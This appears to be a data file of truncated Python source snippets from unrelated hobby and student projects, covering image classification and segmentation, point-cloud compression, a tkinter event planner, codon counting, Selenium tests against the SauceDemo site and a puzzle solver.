    "import PIL\nimport streamlit as st \nfrom tensorflow.keras.preprocessing import image\nimport numpy as np\n\ndef get_model_output(model , processor) : \n\n    image = PIL.Image.open('Uploaded_file.jpg')\n\n    inputs = processor(images = image , return_tensors = 'pt')\n    outputs = model(**inputs)\n    results = processor.post_process_object_detection(\n        outputs , \n        target_sizes = torch.tensor([image.size[: : -1]]) , \n        threshold = 0.9)[0]\n\n    if len(results['labels']) == 0 : return False \n    for label in results['labels'] : \n\n        if model.config.id2label[label.item()] in [\n            'cow' , 'buffalo' \n        ] : return True \n\n    return False\n\n\ndef preprocess_image(image_path) : \n\n    img = image.load_img(image_path , target_size = (224 , 224)) \n    \n    img_array = image.img_to_array(img) \n    img_array = np.expand_dims(img_array , axis = 0) \n    \n    return img_array\n\ndef get_label(classifier_model , bb_model , processor) : \n\n    c_label = None\n    counter = 0\n    cattles = True\n\n    if get_model_output(bb_model , processor) : \n\n\n        preprocessed_image = preprocess_image('Uploaded_file.jpg')\n        predictions = classifier_model.predict(preprocessed_image)\n\n        if predictions[0][0] >= 0.25 : return 0\n        return 1\n    return 2\n",
    "import cv2\nimport numpy as np\nfrom matplotlib import pyplot as plt\nimport argparse\nimport os\n\n# Argument parser\nparser = argparse.ArgumentParser(description=\"HSV Transformation and Segmentation\")\nparser.add_argument('--image_path', type=str, required=True, help='Path to the input image')\nparser.add_argument('--output_dir', type=str, required=True, help='Directory to save the output images')\nparser.add_argument('--threshold', type=int, default=130, help='Threshold value for segmentation')\nargs = parser.parse_args()\n\n# Load the image\nimage = cv2.imread(args.image_path)\n\n# Convert to LAB color space\nimage_lab = cv2.cvtColor(image, cv2.COLOR_BGR2LAB)\n\n# Split the LAB image into its channels\nL, A, B = cv2.split(image_lab)\n\n# Save the L, A, and B channel images\nos.makedirs(args.output_dir, exist_ok=True)\ncv2.imwrite(os.path.join(args.output_dir, 'L_channel.png'), L)\ncv2.imwrite(os.path.join(args.output_dir, 'A_channel.png'), A)\ncv2.imwrite(os.path.join(args.output_dir, 'B_channel.png'), B)\n\n# Display the LAB channels\nplt.figure(figsize=(15, 5))\nplt.subplot(1, 3, 1)\nplt.imshow(L, cmap='gray')\nplt.title('L Channel')\nplt.axis('off')\n\nplt.subplot(1, 3, 2)\nplt.imshow(A, cmap='gray')\nplt.title('A Channel')\nplt.axis('off')\n\nplt.subplot(1, 3, 3)\nplt.imshow(B, cmap='gray')\nplt.title('B Channel')\nplt.axis('off')\nplt.show()\n\n# Function to adjust the thresholds\ndef segment_green_bell_peppers(A_channel, threshold_value):\n    # Apply threshold to A channel to isolate green regions\n    _, mask = cv2.threshold(A_channel, threshold_value, 255, cv2.THRESH_BINARY_INV)\n\n    # Apply morphological operations to remove noise and enhance the mask\n    kernel = cv2.getStructuringElement(cv2.MORPH_ELLIPSE, (5, 5))\n    mask_morph = cv2.morphologyEx(mask, cv2.MORPH_CLOSE, kernel)\n    mask_morph = cv2.morphologyEx(mask_morph, cv2.MORPH_OPEN, kernel)\n    \n    # Apply the refined mask to the original image\n    segmented = cv2.bitwise_and(image, image, mask=mask_morph)\n    \n    return segmented, mask_morph\n\n# Adjust the threshold value to get a better separation inside the green colors\nsegmented_image, final_mask = segment_green_bell_peppers(A, args.threshold)\n\n# Save the final segmented image and mask\ncv2.imwrite(os.path.join(args.output_dir, 'final_segmented_image.png'), segmented_image)\ncv2.imwrite(os.path.join(args.output_dir, 'final_mask.png'), final_mask)\n\n# Convert the segmented image to RGB for displaying\nsegmented_image_rgb = cv2.cvtColor(segmented_image, cv2.COLOR_BGR2RGB)\n\n# Display the result\nplt.imshow(segmented_image_rgb)\nplt.title(f'Segmented Green Bell Peppers (Threshold: {args.threshold})')\nplt.axis('off')\nplt.show()\n",
    "import os, time\nimport numpy as np\nimport torch\nimport MinkowskiEngine as ME\n\ndevice = torch.device('cuda' if torch.cuda.is_available() else 'cpu')\n\nfrom data_utils import array2vector, istopk, sort_sparse_tensor, load_sparse_tensor, scale_sparse_tensor\nfrom data_utils import write_ply_ascii_geo, read_ply_ascii_geo\nfrom gpcc import gpcc_encode, gpcc_decode\nfrom pc_error import pc_error\nfrom pcc_model import PCCModel\n\nclass CoordinateCoder():\n    \"\"\"encode/decode coordinates using gpcc\n    \"\"\"\n    def __init__(self, filename):\n        self.filename = filename\n        print(filename)\n        self.ply_filename = filename + '.ply'\n\n    def encode(self, coords, postfix=''):\n        coords = coords.numpy().astype('int')\n        write_ply_ascii_geo(filedir=self.ply_filename, coords=coords)\n        gpcc_encode(self.ply_filename, self.filename+postfix+'_C.bin')\n        \n        return \n\n    def decode(self, postfix=''):\n        print(self.filename)\n        gpcc_decode(self.filename+postfix+'_C.bin', self.ply_filename)\n        coords = read_ply_ascii_geo(self.ply_filename)\n        \n        return coords\n\n\nclass FeatureCoder():\n    \"\"\"encode/decode feature using learned entropy model\n    \"\"\"\n    def __init__(self, filename, entropy_model):\n        self.filename = filename\n        self.entropy_model = entropy_model.cpu()\n\n    def encode(self, feats, postfix=''):\n        strings, min_v, max_v = self.entropy_model.compress(feats.cpu())\n        shape = feats.shape\n        with open(self.filename+postfix+'_F.bin', 'wb') as fout:\n            fout.write(strings)\n        with open(self.filename+postfix+'_H.bin', 'wb') as fout:\n            fout.write(np.array(shape, dtype=np.int32).tobytes())\n            fout.write(np.array(len(min_v), dtype=np.int8).tobytes())\n            fout.write(np.array(min_v, dtype=np.float32).tobytes())\n            fout.write(np.array(max_v, dtype=np.float32).tobytes())\n            \n        return \n\n    def decode(self, postfix=''):\n        with open(self.filename+postfix+'_F.bin', 'rb') as fin:\n            strings = fin.read()\n        with open(self.filename+postfix+'_H.bin', 'rb') as fin:\n            shape = np.frombuffer(fin.read(4*2), dtype=np.int32)\n            len_min_v = np.frombuffer(fin.read(1), dtype=np.int8)[0]\n            min_v = np.frombuffer(fin.read(4*len_min_v), dtype=np.float32)[0]\n            max_v = np.frombuffer(fin.read(4*len_min_v), dtype=np.float32)[0]\n\n        feats = self.entropy_model.decompress(strings, min_v, max_v, shape, channels=shape[-1])\n        \n        return feats\n\n\nclass Coder():\n    def __init__(self, model, filename):\n        self.model = model \n        self.filename = filename\n        self.coordinate_coder = CoordinateCoder(filename)\n        self.feature_coder = FeatureCoder(self.filename, model.entropy_bottleneck)\n\n    @torch.no_grad()\n    def encode(self, x, postfix=''):\n        # Encoder\n        y_list = self.model.encoder(x)\n        y = sort_sparse_tensor(y_list[0])\n        num_points = [len(ground_truth) for ground_truth in y_list[1:] + [x]]\n\n        with open(self.filename+postfix+'_num_points.bin', 'wb') as f:\n            f.write(np.array(num_points, dtype=np.int32).tobytes())\n\n        self.feature_coder.encode(y.F, postfix=postfix)\n        self.coordinate_coder.encode((y.C//y.tensor_stride[0]).detach().cpu()[:,1:], postfix=postfix)\n        return y\n\n    @torch.no_grad()\n    def decode(self, rho=1, postfix=''):\n        # decode coords\n        y_C = self.coordinate_coder.decode(postfix=postfix)\n        y_C = torch.cat((torch.zeros((len(y_C),1)).int(), torch.tensor(y_C).int()), dim=-1)\n        indices_sort = np.argsort(array2vector(y_C, y_C.max()+1))\n        y_C = y_C[indices_sort]\n        # decode feat\n        y_F = self.feature_coder.decode(postfix=postfix)\n        y = ME.SparseTensor(features=y_F, coordinates=y_C*8,tensor_stride=8, device=device)\n        # decode label\n        with open(self.filename+postfix+'_num_points.bin', 'rb') as fin:\n            num_points = np.frombuffer(fin.read(4*3), dtype=np.int32).tolist()\n\n            num_points[-1] = int(rho * num_points[-1])# update\n\n            num_points = [[num] for num in num_points]\n        # decode\n        _, out = self.model.decoder(y, nums_list=num_points, ground_truth_list=[None]*3, training=False)\n\n        return out\n\nif __name__ == '__main__':\n    import argparse\n    parser = argparse.ArgumentParser(\n        formatter_class=argparse.ArgumentDefaultsHelpFormatter)\n    parser.add_argument(\"--ckptdir\", default='./ckpts/r02/epoch_8.pth')\n    parser.add_argument(\"--filedir\", default='/media/ivc-18/958e2f20-9a21-425d-8061-48542c9ca6c5/testdata/8iVFB/ricardo_vox9.ply')\n    parser.add_argument(\"--scaling_factor\", type=float, default=1.0, help='scaling_factor')\n    parser.add_argument(\"--rho\", type=float, default=1.0, help='the ratio of the number of output points to the number of input points')\n    parser.add_argument(\"--res\", type=int, default=511, help='resolution')\n    args = parser.parse_args()\n    f",
    "import tensorflow as tf\nfrom tensorflow.keras.models import load_model\nimport cv2\n\n# Assuming you know the image dimensions and number of classes from your dataset\nimage_height = 600  # Adjust based on your data\nimage_width = 600  # Adjust based on your data\nnum_classes = 2  # Adjust based on your data (e.g., 2 for binary)\n\n# Load the trained model\nmodel = load_model('best_model.keras')\n\ndef predict_image(image_path):\n  \"\"\"\n  Preprocesses an image and predicts if it's fake or real.\n\n  Args:\n      image_path: Path to the image file.\n\n  Returns:\n      A string indicating the predicted class (fake or real).\n  \"\"\"\n  # Load the image\n  image = cv2.imread(image_path)\n\n  # Preprocess the image (resize, normalization, etc.)\n  # ... your preprocessing code based on your training pipeline ...\n\n  # Prepare the input\n  image_input = image.reshape([1, image.shape[0], image.shape[1], image.shape[2]])\n\n  # Make a prediction\n  prediction = model.predict(image_input)\n\n  # Interpret the prediction (adjust threshold as needed)\n  if prediction[0][0] > 0.5:\n    return \"fake\"\n  else:\n    return \"real\"\n\n# Example usage (replace with your image path)\nimage_path = r\"C:\\Users\\abhin\\OneDrive\\Desktop\\deepfake_detection\\data\\validation\\real\\mid_179_1111.jpg\"\n\n\nprediction = predict_image(image_path)\nprint(f\"Image predicted to be: {prediction}\")\n",
    "import requests\n\ndef get_video_info(video_url):\n    api_url = f\"https://youtubedownloader-api.onrender.com/youtube-video/?url={video_url}\"\n    response = requests.get(api_url)\n    \n    if response.status_code == 200:\n        data = response.json()\n        video_info = data['response']\n        return video_info\n    else:\n        return None\n\ndef main():\n    video_url = input(\"\u6700\u521d\u306b\u52d5\u753b\u306eURL\u3092\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044: \")\n    video_info = get_video_info(video_url)\n    \n    if video_info:\n        print(\"\u52d5\u753b\u60c5\u5831:\")\n        print(f\"\u30bf\u30a4\u30c8\u30eb: {video_info['title']}\")\n        print(f\"\u8aac\u660e: {video_info['description']}\")\n        print(f\"\u8996\u8074\u56de\u6570: {video_info['viewCount']}\")\n        print(f\"\u30ab\u30c6\u30b4\u30ea: {video_info['category']}\")\n        print(f\"\u516c\u958b\u65e5: {video_info['publishDate']}\")\n        print(f\"\u30c1\u30e3\u30f3\u30cd\u30eb\u540d: {video_info['channelName']}\")\n        print(f\"\u30c1\u30e3\u30f3\u30cd\u30eb\u767b\u9332\u8005\u6570: {video_info['subscriberCount']}\")\n        print(\"\u52d5\u753bURL:\")\n        for video in video_info['videos']:\n            if video['hasAudio']:\n                print(video['url'])\n    else:\n        print(\"\u52d5\u753b\u60c5\u5831\u3092\u53d6\u5f97\u3067\u304d\u307e\u305b\u3093\u3067\u3057\u305f\u3002\")\n\nif __name__ == \"__main__\":\n    main()\n",
    "import tkinter as tk\r\nfrom tkinter import ttk, messagebox\r\nfrom tkcalendar import Calendar\r\nimport datetime\r\nimport os\r\nimport time\r\nimport base64\r\nfrom email.mime.text import MIMEText\r\nimport threading\r\nfrom google_auth_oauthlib.flow import InstalledAppFlow\r\nfrom google.auth.transport.requests import Request\r\nfrom google.oauth2.credentials import Credentials\r\nfrom google_auth_oauthlib.flow import InstalledAppFlow\r\nfrom googleapiclient.discovery import build\r\nfrom requests import HTTPError\r\nimport os.path\r\nimport json\r\nimport requests\r\nimport sys\r\nimport webbrowser\r\n\r\ndef resource_path(relative_path):\r\n    \"\"\" Get absolute path to resource, works for dev and for PyInstaller \"\"\"\r\n    try:\r\n        # PyInstaller creates a temp folder and stores path in _MEIPASS\r\n        base_path = sys._MEIPASS\r\n    except Exception:\r\n        base_path = os.path.abspath(\".\")\r\n\r\n    return os.path.join(base_path, relative_path)\r\n\r\nclass Event:\r\n    def __init__(self, title, description, date, emails, notify_date = None, sent = False):\r\n        self.title = title\r\n        self.description = description\r\n        self.date = date\r\n        self.emails = emails\r\n        self.notify_date = notify_date  # Add a field to store the date and time of the notification\r\n        self.sent = sent\r\n        \r\n    def serialize(self):\r\n        # Converting the event object to a dictionary\r\n        event_dict = {\r\n            \"title\": self.title,\r\n            \"description\": self.description,\r\n            \"date\": self.date.strftime(\"%Y-%m-%d %H:%M:%S\"),  # Convert date to string\r\n            \"emails\": self.emails,\r\n            \"notify_date\": self.notify_date.strftime(\"%Y-%m-%d %H:%M:%S\") if self.notify_date else None,  # Convert the notification date to a string\r\n            \"sent\": self.sent\r\n        }\r\n        return event_dict\r\n    \r\n    @classmethod\r\n    def deserialize(cls, event_dict):\r\n        # Create an event object from the dictionary\r\n        date = datetime.datetime.strptime(event_dict[\"date\"], \"%Y-%m-%d %H:%M:%S\")\r\n        notify_date = datetime.datetime.strptime(event_dict[\"notify_date\"], \"%Y-%m-%d %H:%M:%S\") if event_dict[\"notify_date\"] else None\r\n        return cls(event_dict[\"title\"], event_dict[\"description\"], date, event_dict[\"emails\"], notify_date, event_dict[\"sent\"])\r\n    \r\n\"\"\"\r\nThis is the official English localization.\r\n\"\"\"\r\n\r\nclass EventPlannerApp:\r\n    def __init__(self, root):\r\n        self.load_fonts()\r\n        self.run_notification_loop()\r\n        \r\n        self.root = root\r\n        self.root.title(\"Event Planner\")\r\n        self.style = ttk.Style()\r\n        self.style.theme_use(\"clam\")\r\n        \r\n        # Bind the event save function to the window close event\r\n        self.root.protocol(\"WM_DELETE_WINDOW\", self.close_application)\r\n        \r\n        # Check if theme file exists\r\n        if os.path.exists(\"current_theme.txt\"):\r\n            with open(\"current_theme.txt\", \"r\") as f:\r\n                self.current_theme = f.read()\r\n        else:\r\n            # Set the default theme if the file does not exist\r\n            self.current_theme = \"light\"\r\n        \r\n        self.style.configure(\"Yellow.TButton\",\r\n                        foreground=\"#323232\",\r\n                        background=\"#FCF7C9\",\r\n                        font=(\"Segoe UI Semibold\", 12),\r\n                        padding=10,\r\n                        )\r\n        self.style.map(\"Yellow.TButton\",\r\n                foreground=[(\"active\", \"white\")],\r\n                background=[(\"active\", \"#323232\")],\r\n                )\r\n\r\n        self.main_frame = tk.Frame(self.root, bg='white')\r\n        self.main_frame.pack(expand=True, fill=\"both\")\r\n        \r\n        self.toolbar_frame = tk.Frame(self.main_frame, bg='white')\r\n        self.toolbar_frame.pack(side=\"top\", fill=\"x\")\r\n\r\n        self.new_event_button = ttk.Button(self.toolbar_frame, text=\"New event\", style=\"Yellow.TButton\", command=self.create_event_window)\r\n        self.new_event_button.pack(side=\"left\")\r\n\r\n        self.settings_button = ttk.Button(self.toolbar_frame, text=\"Settings\", style=\"Yellow.TButton\", command=self.open_settings)\r\n        self.settings_button.pack(side=\"right\")\r\n        \r\n        self.save_button = ttk.Button(self.toolbar_frame, text=\"Save\", style=\"Yellow.TButton\", command=self.save_events_to_file)\r\n        self.save_button.pack(side=\"right\", padx=5)  # Add a small gap between the buttons\r\n        \r\n        ttk.Separator(self.main_frame, orient=\"horizontal\").pack(fill=\"x\")\r\n\r\n        self.paned_window = ttk.PanedWindow(self.main_frame, orient=tk.HORIZONTAL)\r\n        self.paned_window.pack(expand=True, fill=\"both\")\r\n\r\n        self.events_frame = ttk.Frame(self.paned_window)\r\n        self.paned_window.add(self.events_frame, weight=1)\r\n\r\n        self.events_listbox = tk.Listbox(self.events_frame, selectmode=\"single\")\r\n        self.events_listbox.pack(expand=True, fill=\"both\")\r\n\r\n        self.events_listbox.bind(\"<Button-3>\", self.show_context_menu)\r\n        self.events_listbox.bind(\"<<ListboxSelec",
    "# -*- coding: utf-8 -*-\r\n\"\"\"\r\nCreated on Wed Feb  8 15:01:23 2023\r\n\r\n@author: Tommy\r\n\"\"\"\r\nimport gzip\r\nfrom glob import glob\r\nimport matplotlib.pyplot as plt\r\nimport os\r\n\r\ndef openfile(filePath):  # openening and reading the fastafile and gfffile\r\n    if filePath.endswith(\".gz\"):\r\n        with gzip.open(filePath, 'rt') as f:\r\n            return [l.strip() for l in f.readlines()]\r\n    else:\r\n        with open(filePath, 'r') as f:\r\n            return [l.strip() for l in f.readlines()]\r\n\r\ndef GcContent(seq):  # calculating the gc content percentage\r\n    return round((seq.count('C') + seq.count('G')) / len(seq) * 100, 6)\r\n\r\ndef parse_fasta(filename):\r\n    FastaFile = openfile(filename)\r\n    FDict = {}\r\n    chromosomeID = \"\"\r\n    nucleotide_sequence = \"\"\r\n    for line in FastaFile:\r\n        line = line.strip()\r\n        if line.startswith(\">\"):\r\n            if chromosomeID != \"\":\r\n                FDict[chromosomeID] = nucleotide_sequence\r\n                nucleotide_sequence = \"\"\r\n            chromosomeID = line.strip().split(' ')[2].split(':')[2]\r\n        else:\r\n            nucleotide_sequence += line\r\n    # adds the last sequence to the dictionary because there isn't a > after the last line\r\n    FDict[chromosomeID] = nucleotide_sequence\r\n    return FDict\r\n\r\ndef parse_gff(gff_file):\r\n    gff_dict = {}\r\n    f = openfile(gff_file)\r\n    for line in f:\r\n        if line.startswith('#'):\r\n            continue\r\n        fields = line.strip().split('\\t')\r\n        if fields[2] == 'gene':\r\n            gene_id = fields[8].split(';')[0]\r\n            start = int(fields[3])\r\n            stop = int(fields[4])\r\n            chromosome = fields[0]\r\n            gff_dict[gene_id] = (start, stop, chromosome) # creates gff dict\r\n    return gff_dict  # Press Ctrl+F8 to toggle the breakpoint.\r\n\r\ndef get_End_Seq(gff_dict, FDict, gene):\r\n    stopRegion = gff_dict[gene][1]          #stop coordinates of gene\r\n    chromosome = gff_dict[gene][2]\r\n    endSeq = (FDict[chromosome][stopRegion + 2:stopRegion + 14])\r\n    return endSeq\r\n\r\ndef get_Initial_StopCodon(gff_dict, FDict, gene):\r\n    stopRegion = gff_dict[gene][1]\r\n    chromosome = gff_dict[gene][2]\r\n    initialStopCodon = (FDict[chromosome][stopRegion - 1:stopRegion+2])# stop codons ????\r\n    return initialStopCodon\r\n\r\ndef get_start_Seq(gff_dict, FDict, gene):\r\n    startRegion = gff_dict[gene][0]\r\n    chromosome = gff_dict[gene][2]\r\n    startSeq = (FDict[chromosome][startRegion - 13:startRegion - 1]) # front end\r\n    return startSeq\r\n\r\ndef get_Initial_StartCodon(gff_dict, FDict, gene):\r\n    startRegion = gff_dict[gene][0]\r\n    chromosome = gff_dict[gene][2]\r\n    initialStartCodon = (FDict[chromosome][startRegion - 1:startRegion + 2]) # start codons ???\r\n    return initialStartCodon\r\n\r\ndef tandemStopCount(endSeq, initialStopCodon, total_stop_codons, total_stop_codons_dict):\r\n    stop_codons = [\"TAA\", \"TAG\", \"TGA\"] # list of possible stop codons\r\n    initialStopCodon_count = 0\r\n    tan_TAA_count = 0\r\n    tan_TAG_count = 0\r\n    tan_TGA_count = 0\r\n    freq = {codon: 0 for codon in stop_codons}\r\n    indexes = {codon: [] for codon in stop_codons}\r\n    for i in range(0, len(endSeq) - 2, 3):  # loops over all stop codons in the endseq\r\n        if len(endSeq) - i >= 3:  # Check if there are at least 3 characters left to form a codon\r\n            codon = endSeq[i:i + 3]\r\n            if codon in stop_codons:\r\n                if (i + 3) % 3 == 0:\r\n                    freq[codon] += 1\r\n                    indexes[codon].append(i)\r\n                    if codon == 'TAA':\r\n                        tan_TAA_count += 1 # iterates to count the condon usage\r\n                    if codon == 'TAG':\r\n                        tan_TAG_count += 1\r\n                    if codon == 'TGA':\r\n                        tan_TGA_count += 1\r\n                total_stop_codons += 1\r\n    if initialStopCodon in stop_codons:\r\n        initialStopCodon_count += 1\r\n        total_stop_codons_dict[initialStopCodon] = (\r\n            total_stop_codons_dict[initialStopCodon][0] + initialStopCodon_count, # returns count to the dict to count frequecy on multiple genes\r\n            total_stop_codons_dict[initialStopCodon][1] + tan_TAA_count,\r\n            total_stop_codons_dict[initialStopCodon][2] + tan_TAG_count,\r\n            total_stop_codons_dict[initialStopCodon][3] + tan_TGA_count\r\n        )\r\n    tandemStopCountData = [freq, indexes, total_stop_codons, total_stop_codons_dict]\r\n    return tandemStopCountData\r\n\r\ndef tandemStartCount(startSeq, initialStartCodon, total_start_codons, total_start_codons_dict):\r\n    start_codons = [\"ATG\", \"GTG\", \"TTG\"] # list of possible start codons\r\n    initialStartCodon_count = 0\r\n    tan_ATG_count = 0\r\n    tan_GTG_count = 0\r\n    tan_TTG_count = 0\r\n    freq = {codon: 0 for codon in start_codons}\r\n    indexes = {codon: [] for codon in start_codons}\r\n    for i in range(0, len(startSeq) - 2, 3):  # loops over all stop codons in the startseq\r\n        codon = startSeq[i:i + 3]\r\n        if codon in start_codons:\r\n    ",
    "# Gerekli k\u00fct\u00fcphaneleri i\u00e7e aktar\nfrom selenium import webdriver\nfrom time import sleep\nfrom selenium.webdriver.common.by import By\nfrom constants.magicStringDenemeleri import *\nimport pytest\n\n\n# Test fonksiyonu\ndef test_saucedemo_login():\n    # WebDriver konfig\u00fcrasyonu\n    driver = webdriver.Chrome()\n\n    # SauceDemo'ya giri\u015f yapmak i\u00e7in kullan\u0131c\u0131 ad\u0131 ve \u015fifre\n    USERNAME = 'standard_user'\n    PASSWORD = 'secret_sauce'\n\n    # SauceDemo web sitesini a\u00e7\n    driver.get('https://www.saucedemo.com')\n\n    # Kullan\u0131c\u0131 ad\u0131 ve \u015fifre ile giri\u015f yap\n    sleep(3)\n    driver.find_element(By.ID,username_id).send_keys(USERNAME)\n    driver.find_element(By.ID,password_id).send_keys(PASSWORD)\n    driver.find_element(By.ID,login_button_id).click()\n\n    # \u0130lk \u00fcr\u00fcn\u00fc sepete ekle\n    sleep(3)\n    driver.find_element(By.ID,addCart_id).click()\n\n    # Sepet sayfas\u0131na git\n    sleep(3)\n    driver.find_element(By.CLASS_NAME,shoppingCart_id).click()\n\n    # Sepetin i\u00e7indeki \u00fcr\u00fcnleri do\u011frula\n    sleep(3)\n    assert 'Sauce Labs Backpack' in driver.page_source\n\n\n# Pytest ile testi \u00e7al\u0131\u015ft\u0131rmak i\u00e7in terminalde a\u015fa\u011f\u0131daki komutu kullanabilirsiniz:\n# pytest test_saucedemo.py\n    \ndef test_sauce_demo():\n    # WebDriver konfig\u00fcrasyonu\n    driver = webdriver.Chrome()\n\n    # SauceDemo'ya giri\u015f yapmak i\u00e7in kullan\u0131c\u0131 ad\u0131 ve \u015fifre\n    USERNAME = 'standard_user'\n    PASSWORD = 'secret_sauce'\n\n    # SauceDemo web sitesini a\u00e7\n    driver.get('https://www.saucedemo.com')\n\n    # Kullan\u0131c\u0131 ad\u0131 ve \u015fifre ile giri\u015f yap\n    driver.find_element(By.ID,username_id).send_keys(USERNAME)\n    driver.find_element(By.ID,password_id).send_keys(PASSWORD)\n    driver.find_element(By.ID,login_button_id).click()\n\n    # \u0130lk \u00fcr\u00fcn\u00fc sepete ekle\n    driver.find_element(By.ID,addCart_id).click()\n\n    # Sepet sayfas\u0131na git\n    driver.find_element(By.CLASS_NAME,shoppingCart_id).click()\n    sleep(3)\n    # Sepetten \u00fcr\u00fcn\u00fc \u00e7\u0131kar\n    driver.find_element(By.ID,remove_id).click()\n    sleep(3)\n    # Sepetin bo\u015f oldu\u011funu do\u011frula\n    assert 'Sauce Labs Backpack' not in driver.page_source\n\n# Test fonksiyonu\n@pytest.fixture\ndef browser():\n    # WebDriver konfig\u00fcrasyonu\n    driver = webdriver.Chrome()\n    yield driver\n    # Testi bitir ve taray\u0131c\u0131y\u0131 kapat\n    driver.quit()\n\ndef test_checkout_complete(browser):\n    # SauceDemo'ya giri\u015f yapmak i\u00e7in kullan\u0131c\u0131 ad\u0131 ve \u015fifre\n    USERNAME = 'standard_user'\n    PASSWORD = 'secret_sauce'\n\n    # SauceDemo web sitesini a\u00e7\n    browser.get('https://www.saucedemo.com')\n    sleep(3)\n\n    # Kullan\u0131c\u0131 ad\u0131 ve \u015fifre ile giri\u015f yap\n    browser.find_element(By.ID,username_id).send_keys(USERNAME)\n    browser.find_element(By.ID,password_id).send_keys(PASSWORD)\n    browser.find_element(By.ID,login_button_id).click()\n    sleep(3)\n\n    # \u0130lk \u00fcr\u00fcn\u00fc sepete ekle\n    browser.find_element(By.ID,addCart_id).click()\n    sleep(3)\n\n    # Checkout sayfas\u0131na git\n    browser.find_element(By.CLASS_NAME,shoppingCart_id).click()\n    browser.find_element(By.ID,checkout_id).click()\n    sleep(3)\n\n    # Checkout bilgilerini gir\n    browser.find_element(By.ID,firstName_id).send_keys('Test')\n    browser.find_element(By.ID,lastName_id).send_keys('User')\n    browser.find_element(By.ID,postalCode_id).send_keys('12345')\n    browser.find_element(By.ID,continue_id).click()\n    sleep(3)\n\n    # Checkout i\u015flemini tamamla\n    browser.find_element(By.ID,finish_id ).click()\n    sleep(3)\n    # Checkout i\u015fleminin tamamland\u0131\u011f\u0131n\u0131 do\u011frula\n    assert checkout_text in browser.page_source\n\n# Pytest ile testi \u00e7al\u0131\u015ft\u0131rmak i\u00e7in terminalde a\u015fa\u011f\u0131daki komutu kullanabilirsiniz:\n# pytest test_checkout.py\n\n\n\n",
    "from selenium import webdriver\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.support.wait import WebDriverWait #ilgili driver\u0131 bekleten yap\u0131\nfrom selenium.webdriver.support import expected_conditions as ec #beklenen ko\u015fullar\nfrom selenium.webdriver.common.action_chains import ActionChains \nimport pytest\nfrom constants.globalConstants import *\nimport json\n\nclass Test_Demo:\n    def deneme(self):\n        print(\"deneme\")\n\n    #pytest taraf\u0131ndan tan\u0131mlanan bir method \n    #her test \u00f6ncesi otomatik olarak \u00e7al\u0131\u015ft\u0131r\u0131l\u0131r\n    def setup_method(self):\n        self.driver = webdriver.Chrome()\n        self.driver.maximize_window()\n        self.driver.get(BASE_URL)\n\n    #her test bitiminde \u00e7al\u0131\u015facak fonk\n    def teardown_method(self):\n        self.driver.quit()\n\n    @pytest.mark.skip #t\u00fcm testler ko\u015fulurken \"skip\" \u015feklinde i\u015faretlenen testlerimi atl\n    def test_demo(self):\n        print(\"x\")\n        text = \"Hello\"\n        assert text == \"Hello\"\n\n    def getData():\n        return [(\"1\",\"1\"),(\"abc\",\"123\"),(\"deneme\",\"secret_sauce\")]\n    \n   \n            \n    def readInvalidDataFromJSON(json_file_path):\n     with open(json_file_path, 'r') as file:\n        data = json.load(file)\n        invalid_users = data.get('invalid_login_users', [])\n        return [(user.get('username'), user.get('password')) for user in invalid_users]\n\n\n\n\n\n    # def readInvalidDataFromExcel():\n    #     excelFile = openpyxl.load_workbook(\"data/invalidLogin.xlsx\")\n    #     sheet = excelFile[\"Sheet1\"]\n    #     rows = sheet.max_row #ka\u00e7\u0131nc\u0131 sat\u0131ra kadar benim verim var\n    #     data = []\n    #     for i in range(2,rows+1):\n    #         username = sheet.cell(i,1).value\n    #         password = sheet.cell(i,2).value\n    #         data.append((username,password))\n    #     return data\n    \n\n    \n    \n    @pytest.mark.parametrize(\"username, password\", readInvalidDataFromJSON(\"invalid/data.json\"))\n    def test_invalid_login(self,username,password):\n        userNameInput = WebDriverWait(self.driver,5).until(ec.visibility_of_element_located((By.ID,username_id)))\n        passwordInput = WebDriverWait(self.driver,5).until(ec.visibility_of_element_located((By.ID,password_id)))\n        userNameInput.send_keys(username)\n        passwordInput.send_keys(password)\n        loginButton = WebDriverWait(self.driver,5).until(ec.visibility_of_element_located((By.ID,login_button_id)))\n        loginButton.click()\n        errorMessage =WebDriverWait(self.driver,5).until(ec.visibility_of_element_located((By.XPATH,errorMessage_xpath)))\n        assert errorMessage.text == errorMessage_text\n\n\n    def test_valid_login(self):\n        userNameInput = WebDriverWait(self.driver,5).until(ec.visibility_of_element_located((By.ID,username_id)))\n        passwordInput =WebDriverWait(self.driver,5).until(ec.visibility_of_element_located((By.ID,password_id)))\n        actions = ActionChains(self.driver)\n        actions.send_keys_to_element(userNameInput,\"standard_user\")\n        actions.send_keys_to_element(passwordInput,\"secret_sauce\")\n        actions.perform() #depolad\u0131\u011f\u0131m aksiyonlar\u0131 \u00e7al\u0131\u015ft\u0131r\n        loginButton = WebDriverWait(self.driver,5).until(ec.visibility_of_element_located((By.ID,login_button_id)))\n        loginButton.click()\n        baslik =WebDriverWait(self.driver,5).until(ec.visibility_of_element_located((By.XPATH,baslik_xpath)))\n        assert baslik.text == baslik_text\n    \n    def waitForElementVisible(self,locator,timeout=5):\n       return WebDriverWait(self.driver,timeout).until(ec.visibility_of_element_located(locator))       \n        \n        ",
    "traitMap = {\n    \"x\":0,\n    \"m\":1,\n    \"a\":2,\n    \"s\":3\n}\n\ndef solvepart1():\n    #read in data\n    data = fileRead(\"input.txt\")\n    partsReached = False\n    workflows = {}\n    parts = []\n    for rawRow in data:\n        row = rawRow.strip()\n        if row == \"\":\n            partsReached = True\n            continue\n        if not partsReached:\n            line = row.split(\"{\")\n            name = line[0]\n            steps = line[1][:-1].split(\",\")\n            workflows[name] = tuple(steps)\n        else:\n            vals = row[1:-1].split(\",\")\n            parts.append((int(vals[0][2:]),int(vals[1][2:]),int(vals[2][2:]),int(vals[3][2:])))\n\n    #determine whether each part should be rejected or not\n    sum = 0\n    for part in parts:\n        valid = acceptOrRejectPart(part, workflows)\n        if valid:\n            sum = sum + (part[0] + part[1] + part[2] + part[3])\n    print(sum)\n\n#goes through workflows and determines whether a part should be rejected or not\ndef acceptOrRejectPart(part, workflows):\n    currentWorkflow = \"in\"\n    while (currentWorkflow not in (\"R\",\"A\")):\n        rules = workflows[currentWorkflow]\n        for rule in rules:\n            if (\"<\" not in rule) and (\">\" not in rule):\n                currentWorkflow = rule\n                break\n            comp, dest = rule.split(\":\")\n            if \"<\" in comp:\n                trait, amount = comp.split(\"<\")\n                if part[traitMap[trait]] < int(amount):\n                    currentWorkflow = dest\n                    break\n            else:\n                trait, amount = comp.split(\">\")\n                if 